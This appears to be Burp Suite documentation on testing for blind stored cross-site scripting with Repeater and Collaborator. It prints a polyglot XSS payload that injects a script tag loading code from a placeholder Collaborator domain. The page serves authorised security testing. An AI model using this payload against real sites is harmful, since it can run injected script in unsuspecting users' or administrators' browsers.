# Testing for blind XSS

Source: https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/testing-for-blind-xss
Fetched: 2026-06-28T09:16:00.789704+00:00

Support Center

Documentation

Desktop editions

Testing workflow

Testing for vulnerabilities

Testing input validation

Cross-site scripting

Testing for blind XSS

Professional

Testing for blind XSS

Last updated:

June 18, 2026

Read time:

1 Minute

Blind cross-site scripting (XSS) is a type of stored XSS in which the data exit point is not accessible to the attacker, for example due to a lack of privileges.

To test for blind XSS vulnerabilities, you can use Burp Suite to inject an XSS payload that may trigger an out-of-band interaction with the Burp Collaborator server.

Burp monitors the Collaborator server to identify whether an out-of-band interaction occurs. This indicates that the attack was successful.

Steps

To test for blind XSS with Burp Suite:

Right-click the request you want to investigate and select Send to Repeater.

In the Repeater tab, change a parameter's value to a proof-of-concept payload. As you don't know which characters may be filtered or encoded, use a payload that works in most contexts, such as:

</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>

Right-click the appropriate place in the proof-of-concept payload to insert a Collaborator domain and select Insert Collaborator payload. For example, replace yourcollaboratordomain with the Collaborator domain.

Click Send.

The command may be executed after a delay, for example when an administrator eventually views the page that contains the stored payload.

The Collaborator tab flashes when an interaction occurs. You should return to the project file and check the Collaborator tab to identify any delayed interactions.

Related pages

Cross-site scripting

Blog post: Hunting asynchronous vulnerabilities
